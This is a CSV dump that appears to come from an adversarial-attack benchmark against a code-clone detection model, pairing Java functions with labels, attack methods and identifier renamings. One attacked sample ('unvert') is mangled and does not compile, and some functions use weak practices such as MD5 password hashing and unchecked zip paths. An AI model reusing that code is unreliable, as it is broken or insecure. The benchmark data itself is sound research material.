            stmt.executeUpdate(""insert into Instructions (Type, ExecuteString, FrameSlot, Operator, LinkName, ObjectId, AttributeName) "" + ""values (2, null, 'instrument', 3, null, null, 'blue')"");
            stmt.executeUpdate(""insert into Instructions (Type, ExecuteString, FrameSlot, Operator, LinkName, ObjectId, AttributeName) "" + ""values (1, null, null, 0, null, null, null)"");
            stmt.executeUpdate(""insert into Instructions (Type, ExecuteString, FrameSlot, Operator, LinkName, ObjectId, AttributeName) "" + ""values (3, 'get', null, 0, null, null, null)"");
            stmt.executeUpdate(""insert into Instructions (Type, ExecuteString, FrameSlot, Operator, LinkName, ObjectId, AttributeName) "" + ""values (3, 'drop', null, 0, null, null, null)"");
            stmt.executeUpdate(""insert into InstructionGroups (InstructionId, Rank, GroupInstruction) values ("" + (next + 2) + "", 1, "" + (next + 0) + "")"");
            stmt.executeUpdate(""insert into InstructionGroups (InstructionId, Rank, GroupInstruction) values ("" + (next + 2) + "", 2, "" + (next + 1) + "")"");
            stmt.executeUpdate(""insert into InstructionGroups (InstructionId, Rank, GroupInstruction) values ("" + (next + 3) + "", 1, "" + (next + 1) + "")"");
            stmt.executeUpdate(""insert into InstructionGroups (InstructionId, Rank, GroupInstruction) values ("" + (next + 3) + "", 2, "" + (next + 0) + "")"");
            stmt.executeUpdate(""insert into InstructionGroups (InstructionId, Rank, GroupInstruction) values ("" + (next + 4) + "", 1, "" + (next + 2) + "")"");
            stmt.executeUpdate(""insert into InstructionGroups (InstructionId, Rank, GroupInstruction) values ("" + (next + 4) + "", 2, "" + (next + 3) + "")"");
            stmt.executeQuery(""select setval('transactions_transactionid_seq', 1)"");
            stmt.executeUpdate(""insert into Transactions (InstructionId, Description) values ("" + (next + 4) + "", 'throw something')"");
            stmt.executeUpdate(""insert into Transactions (InstructionId, Description) values ("" + (next + 5) + "", 'get something')"");
            stmt.executeUpdate(""insert into Transactions (InstructionId, Description) values ("" + (next + 6) + "", 'drop something')"");
            stmt.executeUpdate(""insert into TransactionPreconditions (TransactionId, IfFrameSlot, Operator, LinkName, LinkFrameSlot, AttributeName, SatisfyTransactionId) "" + ""values (2, 'actor', 1, 'hasa', 'object', '', 3)"");
            stmt.executeUpdate(""insert into TransactionPreconditions (TransactionId, IfFrameSlot, Operator, LinkName, LinkFrameSlot, AttributeName, SatisfyTransactionId) "" + ""values (2, 'object', 4, '', '', 'heavy', 4)"");
            stmt.executeUpdate(""insert into TransactionSlots (TransactionId, FrameSlot, InstructionId) values (2, 'object', "" + (next + 6) + "")"");
            stmt.executeUpdate(""insert into TransactionSlots (TransactionId, FrameSlot, InstructionId) values (2, 'destination', "" + (next + 5) + "")"");
            stmt.executeQuery(""select setval('verbtransactions_verbid_seq', 1)"");
            stmt.executeUpdate(""insert into VerbTransactions (VerbString, MoodType, TransactionId) values ('throw', 2, 2)"");
            stmt.executeUpdate(""insert into VerbConstraints (VerbId, FrameSlot, ObjectId) values (2, 'object', 200)"");
            stmt.executeUpdate(""update SystemProperties set value = 'Play Data' where name = 'DB Data Version'"");
            conn.commit();
        } catch (SQLException e) {
            if (conn != null) conn.rollback();
            throw e;
        } finally {
            if (stmt != null) stmt.close();
            if (conn != null) conn.close();
        }
    }
 <SPLIT>     public HttpResponse fetch(HttpServletRequest request) throws IOException {
        GUI = SwingUI.getApplicatoin();
        DefaultHttpClient httpclient = new DefaultHttpClient();
        CookieSpecFactory csf = new CookieSpecFactory() {

            public CookieSpec newInstance(HttpParams params) {
                return new BrowserCompatSpec() {

                    @Override
                    public void validate(Cookie cookie, CookieOrigin origin) throws MalformedCookieException {
                    }
                };
            }
        };
        if (Helper.useProxy()) {
            HttpHost proxy = new HttpHost(Helper.getProxyServer(), Helper.getProxyPort());
            httpclient.getParams().setParameter(ConnRoutePNames.DEFAULT_PROXY, proxy);
        }
        httpclient.getCookieSpecs().register(""easy"", csf);
        httpclient.getParams().setParameter(ClientPNames.COOKIE_POLICY, ""easy"");
        String currentRemoteGAEHost = Helper.getRemoteServer();
        try {
            HttpUriRequest httpRequest = createRequest(request);
            addHeader(request, httpRequest);
            HttpResponse response = httpclient.execute(httpRequest);
            if (response.getStatusLine().getStatusCode() == HttpStatus.SC_FORBIDDEN) {
                challengeProxy(currentRemoteGAEHost);
            }
            logger.info(Helper.count.incrementAndGet() + "" Response received from "" + request.getRequestURL().toString() + "", status is "" + response.getStatusLine());
            GUI.updateFetchCount();
            return response;
        } catch (ClientProtocolException e) {
            logger.error(""Fetch ClientProtocol Error"", e);
            throw e;
        } catch (IOException e) {
            logger.error(""Fetch IO Error"", e);
            throw e;
        }
    }
",2154,,LABEL_0,LABEL_0,LABEL_0,-1,"load,conn,stmt",,,,0,,0,GA,1299,1.0336684385935466,failed,[]
87,"    protected int deleteBitstreamInfo(int id, Connection conn) {
        PreparedStatement stmt = null;
        int numDeleted = 0;
        try {
            stmt = conn.prepareStatement(DELETE_BITSTREAM_INFO);
            stmt.setInt(1, id);
            numDeleted = stmt.executeUpdate();
            if (numDeleted > 1) {
                conn.rollback();
                throw new IllegalStateException(""Too many rows deleted! Number of rows deleted: "" + numDeleted + "" only one row should be deleted for bitstream id "" + id);
            }
        } catch (SQLException e) {
            LOG.error(""Problem deleting bitstream. "" + e.getMessage(), e);
            throw new RuntimeException(""Problem deleting bitstream. "" + e.getMessage(), e);
        } finally {
            cleanup(stmt);
        }
        return numDeleted;
    }
 <SPLIT>     public String sendRequest(java.lang.String servletName, java.lang.String request) {
        String reqxml = """";
        org.jdom.Document retdoc = null;
        String myurl = java.util.prefs.Preferences.systemRoot().get(""serverurl"", """");
        String myport = java.util.prefs.Preferences.systemRoot().get(""portno"", ""8080"");
        if (this.serverURL == null) {
            try {
                java.net.URL codebase = newgen.presentation.NewGenMain.getAppletInstance().getCodeBase();
                if (codebase != null) serverURL = codebase.getHost(); else serverURL = ""localhost"";
            } catch (Exception exp) {
                exp.printStackTrace();
                serverURL = ""localhost"";
            }
            newgen.presentation.component.IPAddressPortNoDialog ipdig = new newgen.presentation.component.IPAddressPortNoDialog(myurl, myport);
            ipdig.show();
            serverURL = myurl = ipdig.getIPAddress();
            myport = ipdig.getPortNo();
            java.util.prefs.Preferences.systemRoot().put(""serverurl"", serverURL);
            java.util.prefs.Preferences.systemRoot().put(""portno"", myport);
            System.out.println(serverURL);
        }
        try {
            System.out.println(""http://"" + serverURL + "":"" + myport + ""/newgenlibctxt/"" + servletName);
            java.net.URL url = new java.net.URL(""http://"" + serverURL + "":"" + myport + ""/newgenlibctxt/"" + servletName);
            java.net.URLConnection urlconn = (java.net.URLConnection) url.openConnection();
            urlconn.setDoOutput(true);
            urlconn.setRequestProperty(""Content-type"", ""text/xml; charset=UTF-8"");
            java.io.OutputStream os = urlconn.getOutputStream();
            String req1xml = request;
            java.util.zip.CheckedOutputStream cos = new java.util.zip.CheckedOutputStream(os, new java.util.zip.Adler32());
            java.util.zip.GZIPOutputStream gop = new java.util.zip.GZIPOutputStream(cos);
            java.io.OutputStreamWriter dos = new java.io.OutputStreamWriter(gop, ""UTF-8"");
            System.out.println(req1xml);
            dos.write(req1xml);
            dos.flush();
            dos.close();
            System.out.println(""url conn: "" + urlconn.getContentEncoding() + ""  "" + urlconn.getContentType());
            java.io.InputStream ios = urlconn.getInputStream();
            java.util.zip.CheckedInputStream cis = new java.util.zip.CheckedInputStream(ios, new java.util.zip.Adler32());
            java.util.zip.GZIPInputStream gip = new java.util.zip.GZIPInputStream(cis);
            java.io.InputStreamReader br = new java.io.InputStreamReader(gip, ""UTF-8"");
            retdoc = (new org.jdom.input.SAXBuilder()).build(br);
        } catch (java.net.ConnectException conexp) {
            javax.swing.JOptionPane.showMessageDialog(null, newgen.presentation.NewGenMain.getAppletInstance().getMyResource().getString(""ConnectExceptionMessage""), ""Critical error"", javax.swing.JOptionPane.ERROR_MESSAGE);
        } catch (Exception exp) {
            exp.printStackTrace(System.out);
        }
        System.out.println(reqxml);
        return """";
    }
",135,,LABEL_0,LABEL_0,LABEL_0,-1,"deleteBitstreamInfo,id,conn,stmt,numDeleted",,,,0,,0,GA,1923,0.7326100627581279,failed,[]
88,"    public void convert(File src, File dest) throws IOException {
        InputStream in = new BufferedInputStream(new FileInputStream(src));
        DcmParser p = pfact.newDcmParser(in);
        Dataset ds = fact.newDataset();
        p.setDcmHandler(ds.getDcmHandler());
        try {
            FileFormat format = p.detectFileFormat();
            if (format != FileFormat.ACRNEMA_STREAM) {
                System.out.println(""\n"" + src + "": not an ACRNEMA stream!"");
                return;
            }
            p.parseDcmFile(format, Tags.PixelData);
            if (ds.contains(Tags.StudyInstanceUID) || ds.contains(Tags.SeriesInstanceUID) || ds.contains(Tags.SOPInstanceUID) || ds.contains(Tags.SOPClassUID)) {
                System.out.println(""\n"" + src + "": contains UIDs!"" + "" => probable already DICOM - do not convert"");
                return;
            }
            boolean hasPixelData = p.getReadTag() == Tags.PixelData;
            boolean inflate = hasPixelData && ds.getInt(Tags.BitsAllocated, 0) == 12;
            int pxlen = p.getReadLength();
            if (hasPixelData) {
                if (inflate) {
                    ds.putUS(Tags.BitsAllocated, 16);
                    pxlen = pxlen * 4 / 3;
                }
                if (pxlen != (ds.getInt(Tags.BitsAllocated, 0) >>> 3) * ds.getInt(Tags.Rows, 0) * ds.getInt(Tags.Columns, 0) * ds.getInt(Tags.NumberOfFrames, 1) * ds.getInt(Tags.NumberOfSamples, 1)) {
                    System.out.println(""\n"" + src + "": mismatch pixel data length!"" + "" => do not convert"");
                    return;
                }
            }
            ds.putUI(Tags.StudyInstanceUID, uid(studyUID));
            ds.putUI(Tags.SeriesInstanceUID, uid(seriesUID));
            ds.putUI(Tags.SOPInstanceUID, uid(instUID));
            ds.putUI(Tags.SOPClassUID, classUID);
            if (!ds.contains(Tags.NumberOfSamples)) {
                ds.putUS(Tags.NumberOfSamples, 1);
            }
            if (!ds.contains(Tags.PhotometricInterpretation)) {
                ds.putCS(Tags.PhotometricInterpretation, ""MONOCHROME2"");
            }
            if (fmi) {
                ds.setFileMetaInfo(fact.newFileMetaInfo(ds, UIDs.ImplicitVRLittleEndian));
            }
            OutputStream out = new BufferedOutputStream(new FileOutputStream(dest));
            try {
            } finally {
                ds.writeFile(out, encodeParam());
                if (hasPixelData) {
                    if (!skipGroupLen) {
                        out.write(PXDATA_GROUPLEN);
                        int grlen = pxlen + 8;
                        out.write((byte) grlen);
                        out.write((byte) (grlen >> 8));
                        out.write((byte) (grlen >> 16));
                        out.write((byte) (grlen >> 24));
                    }
                    out.write(PXDATA_TAG);
                    out.write((byte) pxlen);
                    out.write((byte) (pxlen >> 8));
                    out.write((byte) (pxlen >> 16));
                    out.write((byte) (pxlen >> 24));
                }
                if (inflate) {
                    int b2, b3;
                    for (; pxlen > 0; pxlen -= 3) {
                        out.write(in.read());
                        b2 = in.read();
                        b3 = in.read();
                        out.write(b2 & 0x0f);
                        out.write(b2 >> 4 | ((b3 & 0x0f) << 4));
                        out.write(b3 >> 4);
                    }
                } else {
                    for (; pxlen > 0; --pxlen) {
                        out.write(in.read());
                    }
                }
                out.close();
            }
            System.out.print('.');
        } finally {
            in.close();
        }
    }
 <SPLIT>     private void forBundle(BundleManipulator manip) {
        ByteArrayOutputStream bout = null;
        try {
            bout = new ByteArrayOutputStream();
            ZipOutputStream zout = new ZipOutputStream(bout);
            Bundle bundle = getBundle();
            Enumeration<URL> files = bundle.findEntries(""/"", ""*.vm"", false);
            if (files != null) {
                while (files.hasMoreElements()) {
                    URL url = files.nextElement();
                    String name = url.getFile();
                    if (name.startsWith(""/"")) {
                        name = name.substring(1);
                    }
                    if (manip.includeEntry(name)) {
                        zout.putNextEntry(new ZipEntry(name));
                        IOUtils.copy(url.openStream(), zout);
                    }
                }
            }
            manip.finish(bundle, zout);
            Manifest mf = new Manifest(bundle.getEntry(""META-INF/MANIFEST.MF"").openStream());
            zout.putNextEntry(new ZipEntry(""META-INF/MANIFEST.MF""));
            mf.write(zout);
            zout.close();
            File tmpFile = File.createTempFile(TEMPLATES_SYMBOLIC_NAME, "".jar"");
            FileUtils.writeByteArrayToFile(tmpFile, bout.toByteArray());
            if (pluginAccessor.getPlugin(TEMPLATES_SYMBOLIC_NAME) != null) {
                pluginController.uninstall(pluginAccessor.getPlugin(TEMPLATES_SYMBOLIC_NAME));
            } else if (pluginAccessor.getPlugin(TEMPLATES_PLUGIN_KEY) != null) {
                pluginController.uninstall(pluginAccessor.getPlugin(TEMPLATES_PLUGIN_KEY));
            }
            pluginController.installPlugin(new JarPluginArtifact(tmpFile));
            ServiceReference ref = bundleContext.getServiceReference(PackageAdmin.class.getName());
            ((PackageAdmin) bundleContext.getService(ref)).refreshPackages(null);
            tmpFile.delete();
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            IOUtils.closeQuietly(bout);
        }
    }
",765,"    public void unvert(File sc, File dest) throws IOException {
        InputStreaminn = new BufferedInputStream(new FileInputStream(sc));
        DcmParser per = pfact.newDcmParser(in);
        Dataset ds = fact.newDataset();
        per.setDcmHandler(ds.getDcmHandler());
        try {
            FileFormat folayout per.detectFileFormat();
            if (layout != FileFormat.ACRNEMA_STREAM) {
                System.out.println(""
"" + sc + "": not an ACRNEMA stream!"");
                return;
            }
            per.parseDcmFile(layout, Tags.PixelData);
            if (ds.contains(Tags.StudyInstanceUID) || ds.contains(Tags.SeriesInstanceUID) || ds.contains(Tags.SOPInstanceUID) || ds.contains(Tags.SOPClassUID)) {
                System.out.println(""
"" + sc + "": contains UIDs!"" + "" => probable already DICOM - do not convert"");
                return;
            }
            boolean hahasPixelData per.getReadTag() == Tags.PixelData;
            boolean inflate = hasPixelData && ds.getInt(Tags.BitsAllocated, 0) == 12;
            int pxpxlen per.getReadLength();
            if (hasPixelData) {
                if (inflate) {
                    ds.putUS(Tags.BitsAllocated, 16);
                    pxlen = pxlen * 4 / 3;
                }
                if (pxlen != (ds.getInt(Tags.BitsAllocated, 0) >>> 3) * ds.getInt(Tags.Rows, 0) * ds.getInt(Tags.Columns, 0) * ds.getInt(Tags.NumberOfFrames, 1) * ds.getInt(Tags.NumberOfSamples, 1)) {
                    System.out.println(""
"" + sc + "": mismatch pixel data length!"" + "" => do not convert"");
                    return;
                }
            }
            ds.putUI(Tags.StudyInstanceUID, uid(studyUID));
            ds.putUI(Tags.SeriesInstanceUID, uid(seriesUID));
            ds.putUI(Tags.SOPInstanceUID, uid(instUID));
            ds.putUI(Tags.SOPClassUID, classUID);
            if (!ds.contains(Tags.NumberOfSamples)) {
                ds.putUS(Tags.NumberOfSamples, 1);
            }
            if (!ds.contains(Tags.PhotometricInterpretation)) {
                ds.putCS(Tags.PhotometricInterpretation, ""MONOCHROME2"");
            }
            if (fmi) {
                ds.setFileMetaInfo(fact.newFileMetaInfo(ds, UIDs.ImplicitVRLittleEndian));
            }
            OutputStream out = new BufferedOutputStream(new FileOutputStream(dest));
            try {
            } finally {
                ds.writeFile(out, encodeParam());
                if (hasPixelData) {
                    if (!skipGroupLen) {
                        out.write(PXDATA_GROUPLEN);
                        int grlen = pxlen + 8;
                        out.write((byte) grlen);
                        out.write((byte) (grlen >> 8));
                        out.write((byte) (grlen >> 16));
                        out.write((byte) (grlen >> 24));
                    }
                    out.write(PXDATA_TAG);
                    out.write((byte) pxlen);
                    out.write((byte) (pxlen >> 8));
                    out.write((byte) (pxlen >> 16));
                    out.write((byte) (pxlen >> 24));
                }
                if (inflate) {
                    int b2, b3;
                    for (; pxlen > 0; pxlen -= 3) {
                        out.write(in.read());
                        b2 = in.read();
                        b3 = in.read();
                        out.write(b2 & 0x0f);
                        out.write(b2 >> 4 | ((b3 & 0x0f) << 4));
                        out.write(b3 >> 4);
                    }
                } else {
                    for (; pxlen > 0; --pxlen) {
                        out.write(in.read());
                    }
                }
                out.close();
            }
            System.out.print('.');
        } finally {
            in.close();
        }
    }
",LABEL_1,LABEL_1,0.5442560315132141,1,"convert,src,dest,in,p,ds,format,hasPixelData,inflate,pxlen,out",,,,75,"convert:unvert,src:sc,dest:dest,in:in,p:per,ds:ds,format:layout,hasPixelData:hasPixelData,inflate:inflate,pxlen:pxlen,out:out,",7,GA,587,0.24823126792907715,ga,[]
89,"    public String upload() {
        System.out.println(imgFile);
        String destDir = ""E:\\ganymede_workspace\\training01\\web\\user_imgs\\map_bg.jpg"";
        FileOutputStream fos;
        try {
            fos = new FileOutputStream(new File(destDir));
            IOUtils.copy(new FileInputStream(imgFile), fos);
            IOUtils.closeQuietly(fos);
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return ""show"";
    }
 <SPLIT>     public void convert(File src, File dest) throws IOException {
        InputStream in = new BufferedInputStream(new FileInputStream(src));
        DcmParser p = pfact.newDcmParser(in);
        Dataset ds = fact.newDataset();
        p.setDcmHandler(ds.getDcmHandler());
        try {
            FileFormat format = p.detectFileFormat();
            if (format != FileFormat.ACRNEMA_STREAM) {
                System.out.println(""\n"" + src + "": not an ACRNEMA stream!"");
                return;
            }
            p.parseDcmFile(format, Tags.PixelData);
            if (ds.contains(Tags.StudyInstanceUID) || ds.contains(Tags.SeriesInstanceUID) || ds.contains(Tags.SOPInstanceUID) || ds.contains(Tags.SOPClassUID)) {
                System.out.println(""\n"" + src + "": contains UIDs!"" + "" => probable already DICOM - do not convert"");
                return;
            }
            boolean hasPixelData = p.getReadTag() == Tags.PixelData;
            boolean inflate = hasPixelData && ds.getInt(Tags.BitsAllocated, 0) == 12;
            int pxlen = p.getReadLength();
            if (hasPixelData) {
                if (inflate) {
                    ds.putUS(Tags.BitsAllocated, 16);
                    pxlen = pxlen * 4 / 3;
                }
                if (pxlen != (ds.getInt(Tags.BitsAllocated, 0) >>> 3) * ds.getInt(Tags.Rows, 0) * ds.getInt(Tags.Columns, 0) * ds.getInt(Tags.NumberOfFrames, 1) * ds.getInt(Tags.NumberOfSamples, 1)) {
                    System.out.println(""\n"" + src + "": mismatch pixel data length!"" + "" => do not convert"");
                    return;
                }
            }
            ds.putUI(Tags.StudyInstanceUID, uid(studyUID));
            ds.putUI(Tags.SeriesInstanceUID, uid(seriesUID));
            ds.putUI(Tags.SOPInstanceUID, uid(instUID));
            ds.putUI(Tags.SOPClassUID, classUID);
            if (!ds.contains(Tags.NumberOfSamples)) {
                ds.putUS(Tags.NumberOfSamples, 1);
            }
            if (!ds.contains(Tags.PhotometricInterpretation)) {
                ds.putCS(Tags.PhotometricInterpretation, ""MONOCHROME2"");
            }
            if (fmi) {
                ds.setFileMetaInfo(fact.newFileMetaInfo(ds, UIDs.ImplicitVRLittleEndian));
            }
            OutputStream out = new BufferedOutputStream(new FileOutputStream(dest));
            try {
            } finally {
                ds.writeFile(out, encodeParam());
                if (hasPixelData) {
                    if (!skipGroupLen) {
                        out.write(PXDATA_GROUPLEN);
                        int grlen = pxlen + 8;
                        out.write((byte) grlen);
                        out.write((byte) (grlen >> 8));
                        out.write((byte) (grlen >> 16));
                        out.write((byte) (grlen >> 24));
                    }
                    out.write(PXDATA_TAG);
                    out.write((byte) pxlen);
                    out.write((byte) (pxlen >> 8));
                    out.write((byte) (pxlen >> 16));
                    out.write((byte) (pxlen >> 24));
                }
                if (inflate) {
                    int b2, b3;
                    for (; pxlen > 0; pxlen -= 3) {
                        out.write(in.read());
                        b2 = in.read();
                        b3 = in.read();
                        out.write(b2 & 0x0f);
                        out.write(b2 >> 4 | ((b3 & 0x0f) << 4));
                        out.write(b3 >> 4);
                    }
                } else {
                    for (; pxlen > 0; --pxlen) {
                        out.write(in.read());
                    }
                }
                out.close();
            }
            System.out.print('.');
        } finally {
            in.close();
        }
    }
",103,,LABEL_1,LABEL_1,LABEL_1,-1,"upload,destDir,fos",,,,0,,0,GA,1186,0.45196236769358317,failed,[]
90,"    protected BufferedImage handleFCLAException() {
        if (params.uri.startsWith(""http://image11.fcla.edu/cgi"")) try {
            params.uri = params.uri.substring(params.uri.indexOf(""q1="") + 3);
            params.uri = params.uri.substring(0, params.uri.indexOf(""&""));
            params.uri = ""http://image11.fcla.edu/m/map/thumb/"" + params.uri.substring(params.uri.length() - 3, params.uri.length() - 2) + ""/"" + params.uri.substring(params.uri.length() - 2, params.uri.length() - 1) + ""/"" + params.uri.substring(params.uri.length() - 1, params.uri.length()) + ""/"" + params.uri + "".jpg"";
            URL url = new URL(params.uri);
            URLConnection connection = url.openConnection();
            return processNewUri(connection);
        } catch (Exception e) {
        }
        return null;
    }
 <SPLIT>     public static String getMessageDigest(String[] inputs) {
        if (inputs.length == 0) return null;
        try {
            MessageDigest sha = MessageDigest.getInstance(""SHA-1"");
            for (String input : inputs) sha.update(input.getBytes());
            byte[] hash = sha.digest();
            String CPass = """";
            int h = 0;
            String s = """";
            for (int i = 0; i < 20; i++) {
                h = hash[i];
                if (h < 0) h += 256;
                s = Integer.toHexString(h);
                if (s.length() < 2) CPass = CPass.concat(""0"");
                CPass = CPass.concat(s);
            }
            CPass = CPass.toUpperCase();
            return CPass;
        } catch (NoSuchAlgorithmException e) {
            throw new IllegalStateException(e.getMessage());
        }
    }
",215,,LABEL_0,LABEL_0,LABEL_0,-1,"handleFCLAException,params,uri,url,connection",,,,0,,0,GA,1513,0.5567555785179138,failed,[]
91,"    public static PersistencyParameters parse(String unitName) {
        URL[] persistenceUnits;
        try {
            persistenceUnits = Classpath.search(""META-INF/"", ""persistence.xml"");
        } catch (IOException e) {
            throw new Error(e);
        }
        Set classes = new HashSet();
        for (int i = 0; i < persistenceUnits.length; i++) {
            URL url = persistenceUnits[i];
            try {
                nu.xom.Builder b = new nu.xom.Builder(false);
                Document d = b.build(url.openStream());
                Nodes unitNodes = d.getRootElement().query(""//p:persistence-unit"", new XPathContext(""p"", ""http://java.sun.com/xml/ns/persistence""));
                for (int j = 0; j < unitNodes.size(); j++) {
                    Node unitNode = unitNodes.get(j);
                    Element unitElt = ((Element) unitNode);
                    String uName = unitElt.getAttributeValue(""name"");
                    if (!uName.equals(unitName)) continue;
                    {
                        PersistencyParameters parameters = new PersistencyParameters();
                        Nodes classNodes = unitElt.query(""//p:property"", new XPathContext(""p"", ""http://java.sun.com/xml/ns/persistence""));
                        for (int k = 0; k < classNodes.size(); k++) {
                            Node classNode = classNodes.get(k);
                            if (!(classNode instanceof Element)) continue;
                            Element classElt = (Element) classNode;
                            String elementName = classElt.getAttribute(""name"").getValue();
                            if (elementName.equals(""eclipselink.jdbc.url"")) {
                                String elementValue = classElt.getAttribute(""value"").getValue();
                                parameters.setJdbcUrl(elementValue);
                            } else if (elementName.equals(""eclipselink.jdbc.user"")) {
                                String elementValue = classElt.getAttribute(""value"").getValue();
                                parameters.setDBUserName(elementValue);
                            } else if (elementName.equals(""eclipselink.jdbc.password"")) {
                                String elementValue = classElt.getAttribute(""value"").getValue();
                                parameters.setDBPassword(elementValue);
                            } else if (elementName.equals(""eclipselink.jdbc.driver"")) {
                                String elementValue = classElt.getAttribute(""value"").getValue();
                                parameters.setDBDriverClassName(elementValue);
                            }
                        }
                        return parameters;
                    }
                }
            } catch (Exception x) {
                x.printStackTrace();
                throw new Error(x);
            }
        }
        return null;
    }
 <SPLIT>     public ActionForward execute(ActionMapping mapping, ActionForm form, HttpServletRequest request, HttpServletResponse response) throws Exception {
        InstanciaDelegate delegate = RegistroManager.recuperarInstancia(request);
        if (delegate == null) {
            ActionErrors errors = new ActionErrors();
            errors.add(null, new ActionError(""errors.session""));
            saveErrors(request, errors);
            return mapping.findForward(""fail"");
        }
        AyudaPantalla ayudaPantalla = delegate.obtenerAyudaPantalla();
        TraAyudaPantalla traAyudaPantalla = (TraAyudaPantalla) ayudaPantalla.getTraduccion();
        String urlSonido = traAyudaPantalla.getUrlSonido();
        if (urlSonido == null) {
            return null;
        }
        URL url = new URL(urlSonido);
        URLConnection urlConnection = url.openConnection();
        urlConnection.connect();
        String tipoMime = urlConnection.getContentType();
        log.debug(""Tipo Mime: "" + tipoMime);
        Map audioOptions = new HashMap();
        if (tipoMime.indexOf(""audio"") != -1 || tipoMime.indexOf(""asf"") != -1 || tipoMime.equals(""unknown/unknown"")) {
            audioOptions.put(""id"", ""MediaPlayer"");
            audioOptions.put(""codeBase"", ""http://activex.microsoft.com/activex/controls/mplayer/en/nsmp2inf.cab#Version=6,4,7,1112"");
            audioOptions.put(""classId"", ""CLSID:22D6F312-B0F6-11D0-94AB-0080C74C7E95"");
            audioOptions.put(""mimeType"", ""application/x-mplayer2"");
            audioOptions.put(""urlSonido"", urlSonido);
            audioOptions.put(""pluginSpage"", ""http://www.microsoft.com/Windows/Downloads/Contents/Products/MediaPlayer/"");
        } else if (tipoMime.indexOf(""real"") != -1) {
            audioOptions.put(""id"", ""RVOCX"");
            audioOptions.put(""codeBase"", """");
            audioOptions.put(""classId"", ""clsid:CFCDAA03-8BE4-11cf-B84B-0020AFBBCCFA"");
            audioOptions.put(""mimeType"", ""audio/x-pn-realaudio-plugin"");
            audioOptions.put(""urlSonido"", urlSonido);
            audioOptions.put(""pluginSpage"", """");
        }
        request.setAttribute(""audioOptions"", audioOptions);
        log.debug(""entra success"");
        return mapping.findForward(""success"");
    }
",480,,LABEL_0,LABEL_0,LABEL_0,-1,"parse,unitName,persistenceUnits,classes,i,url,b,d,unitNodes,j,unitNode,unitElt,uName,parameters,classNodes,k,classNode,classElt,elementName,elementValue",,,,0,,0,GA,7191,2.9016678373018903,failed,[]
92,"    private static void setMembers() {
        try {
            URL url = new URL(getTracUrl() + ""newticket"");
            BufferedReader reader = new BufferedReader(new InputStreamReader(url.openStream()));
            String buffer = reader.readLine();
            while (buffer != null) {
                if (buffer.contains(""<select id=\""component\"" name=\""component\"">"")) {
                    Pattern pattern = Pattern.compile("">[^<]+?<"");
                    Matcher matcher = pattern.matcher(buffer);
                    Vector<String> erg = new Vector<String>();
                    int start = 0;
                    while (matcher.find(start)) {
                        int von = matcher.start() + 1;
                        int bis = matcher.end() - 1;
                        erg.add(Recoder.recode(buffer.substring(von, bis), ""UTF-8"", Recoder.getDefaultEncoding()));
                        start = bis;
                    }
                    m_strComponents = new String[erg.size()];
                    erg.toArray(m_strComponents);
                }
                if (buffer.contains(""<select id=\""priority\"" name=\""priority\"">"")) {
                    Pattern pattern = Pattern.compile("">[^<]+?<"");
                    Matcher matcher = pattern.matcher(buffer);
                    Vector<String> erg = new Vector<String>();
                    int start = 0;
                    while (matcher.find(start)) {
                        int von = matcher.start() + 1;
                        int bis = matcher.end() - 1;
                        erg.add(Recoder.recode(buffer.substring(von, bis), ""UTF-8"", Recoder.getDefaultEncoding()));
                        start = bis;
                    }
                    m_strPriorities = new String[erg.size()];
                    erg.toArray(m_strPriorities);
                }
                buffer = reader.readLine();
            }
        } catch (MalformedURLException e) {
            System.out.println(""e1"");
        } catch (IOException e) {
            System.out.println(e);
        }
    }
 <SPLIT>         public void run() {
            try {
                HttpURLConnection con = (HttpURLConnection) url.openConnection();
                con.setRequestMethod(""GET"");
                con.setDoInput(true);
                byte[] encodedPassword = (username + "":"" + password).getBytes();
                BASE64Encoder encoder = new BASE64Encoder();
                con.setRequestProperty(""Authorization"", ""Basic "" + encoder.encode(encodedPassword));
                InputStream is = con.getInputStream();
                BufferedReader rd = new BufferedReader(new InputStreamReader(is));
                String line;
                StringBuffer response = new StringBuffer();
                while ((line = rd.readLine()) != null) {
                    response.append(line);
                    response.append('\n');
                    lastIteraction = System.currentTimeMillis();
                }
                rd.close();
                is.close();
                con.disconnect();
                result = response.toString();
                finish = true;
            } catch (Throwable e) {
                this.e = e;
            }
        }
",397,,LABEL_1,LABEL_0,,-4,"setMembers,url,reader,buffer,pattern,matcher,erg,start,von,bis,m_strComponents,m_strPriorities",,,,0,,0,Greedy,1,0.0007053454717000326,,[]
93,"    public String encrypt(String password) throws Exception {
        MessageDigest md5 = MessageDigest.getInstance(""MD5"");
        md5.update(password.getBytes());
        BigInteger hash = new BigInteger(1, md5.digest());
        String hashword = hash.toString(16);
        return hashword;
    }
 <SPLIT>     private String digest(String input) throws NoSuchAlgorithmException, UnsupportedEncodingException {
        MessageDigest md = MessageDigest.getInstance(""MD5"");
        byte[] md5hash = new byte[64];
        md.update(input.getBytes(""iso-8859-1""), 0, input.length());
        md5hash = md.digest();
        return this.convertToHex(md5hash);
    }
",63,,LABEL_1,LABEL_1,LABEL_1,-1,"encrypt,password,md5,hash,hashword",,,,0,,0,GA,1136,0.40331823428471886,failed,[]
94,"    public static String uncompress(String readPath, boolean mkdir) throws Exception {
        ZipArchiveInputStream arcInputStream = new ZipArchiveInputStream(new FileInputStream(readPath));
        BufferedInputStream bis = new BufferedInputStream(arcInputStream);
        File baseDir = new File(readPath).getParentFile();
        String basePath = baseDir.getPath() + ""/"";
        if (mkdir) {
            String[] schema = readPath.split(""/"");
            String baseName = schema[schema.length - 1].replaceAll("".zip"", """");
            FileUtils.forceMkdir(new File(basePath + baseName));
            basePath = basePath + baseName + ""/"";
        }
        ArchiveEntry entry;
        while ((entry = arcInputStream.getNextEntry()) != null) {
            if (entry.isDirectory()) {
                FileUtils.forceMkdir(new File(basePath + entry.getName()));
            } else {
                String writePath = basePath + entry.getName();
                String dirName = FilenameUtils.getPath(writePath);
                FileUtils.forceMkdir(new File(dirName));
                BufferedOutputStream bos = new BufferedOutputStream(FileUtils.openOutputStream(new File(writePath)));
                int i = 0;
                while ((i = bis.read()) != -1) {
                    bos.write(i);
                }
                IOUtils.closeQuietly(bos);
            }
        }
        IOUtils.closeQuietly(bis);
        return basePath;
    }
 <SPLIT>     public void createJAR(String fileString, String ext) {
        try {
            File file = new File(fileString);
            int i = fileString.lastIndexOf(java.io.File.separator);
            String dir = fileString.substring(0, i + 1);
            if (ext.matches(""jar"")) {
                jarFile = new File(getClass().getClassLoader().getResource(""jsdviewer.jar"").toURI());
